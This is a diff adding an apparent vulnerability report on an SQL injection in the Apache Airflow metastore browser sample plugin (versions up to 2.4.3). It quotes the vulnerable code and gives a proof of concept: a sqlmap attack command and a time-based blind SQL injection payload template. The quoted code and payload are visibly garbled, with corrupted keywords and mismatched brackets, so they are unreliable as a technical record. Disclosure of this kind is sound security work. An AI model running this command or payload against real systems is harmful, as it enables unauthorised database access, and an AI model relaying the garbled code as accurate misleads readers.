@@ -1,0 +1,21 @@
+# Description
+ Apache airflow metastore browser plugin sql injection vulnerability !
+ Airflow is a platform for scheduling and monitoring workflows for data pipelines written in Python. Airflow is a task scheduling tool that manages task flow through DAG (Directed Acyclic Graph). It does not need to know the specific content of business data, and task scheduling can be realized by setting the dependency relationship of tasks. 
+ Airflow metastore browser plugin is a sample plugin provided by Airflow official website. 
+ affected version 
+ airflow <= 2.4.3 
+
+
+ In the metastore browser, there is the following code ,metastore_browser.hive_metastore.MetastoreBrowserView.partitions
+{
+schema, table = request.args.get("table") .split('.')
+b.TBL_NAME Tike{table]AND
+d.NAME Tike{schemal
+}
+ As can be seen from the above code, the user parameters are directly obtained, and they are directly spliced into the sql statement without any filtering and verification, resulting in sql injection vulnerabilities. 
+ Poc: 
+ 1. First refer to the official documentation to deploy the plugin and set up the connection 
+ 2. Use sqlmap for attack demonstration 
+ python sqlmap.py -r 1.txt --prefix test.  ' --dbms mysql --tech T -v 3 
+// PoC.js
+var payload = AND (SELECT IRANDNUM FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))))) [RANDSTRJ)
